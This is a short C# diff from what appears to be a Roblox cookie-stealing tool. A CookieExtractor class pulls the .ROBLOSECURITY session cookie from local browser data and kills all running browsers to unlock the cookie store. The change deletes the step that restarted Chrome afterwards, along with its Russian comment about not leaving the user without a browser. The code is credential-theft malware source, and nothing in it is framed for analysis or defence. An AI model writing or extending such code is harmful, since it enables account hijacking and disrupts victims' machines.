@@ -35,7 +35,7 @@ public static class CookieExtractor
         catch { }
     }
 
-    public static string? ExtractRobloSecurity(bool allowKillIfLocked = true)
+    public static string? ExtractRobloSecurity()
     {
         Log("=== ExtractRobloSecurity START ===");
         string local = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
@@ -82,13 +82,6 @@ public static class CookieExtractor
             Log("Retry extraction with kill...");
             KillAllBrowsers();
             result = TryExtract();
-        }
-
-        // Всегда перезапускаем Chrome, чтобы не оставлять систему без браузера
-        if (allowKillIfLocked)
-        {
-            Log("Restarting Chrome...");
-            RestartChrome();
         }
 
         return result;
